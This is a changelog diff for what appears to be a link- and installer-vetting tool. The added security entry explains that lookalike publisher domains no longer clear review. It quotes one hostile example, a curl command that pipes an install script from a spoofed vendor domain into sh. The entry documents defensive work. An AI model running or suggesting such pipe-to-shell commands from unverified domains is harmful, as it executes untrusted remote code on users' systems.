@@ -66,6 +66,16 @@
   clears only the publisher's own domain over https; `purpose-mismatch-without-risk`
   and `parser-limit-span` no longer clear release, raw or archive downloads
   from a GitHub account either. Plain repository links are unaffected.
+- **Security: a domain named like the source owner no longer counts as the
+  publisher's.** The owner name comes from the source repository and the
+  domain from whoever registers it, so a fake account `elevenlabs-tools`
+  could clear `curl https://get.elevenlabs.top/install.sh | sh` as the
+  vendor's installer (issue #22). Such a domain now counts only for an
+  established publisher, and nothing establishes one until the publisher
+  check (#14) lands. Installer lines (`vendor-installer`) and snippets or
+  parser-limit passages with a link to the publisher's own website therefore
+  stay open and go to the verifier; a plain link into the owner's own GitHub
+  repository still clears.
 
 ## 0.4.0 - 2026-09-30
 
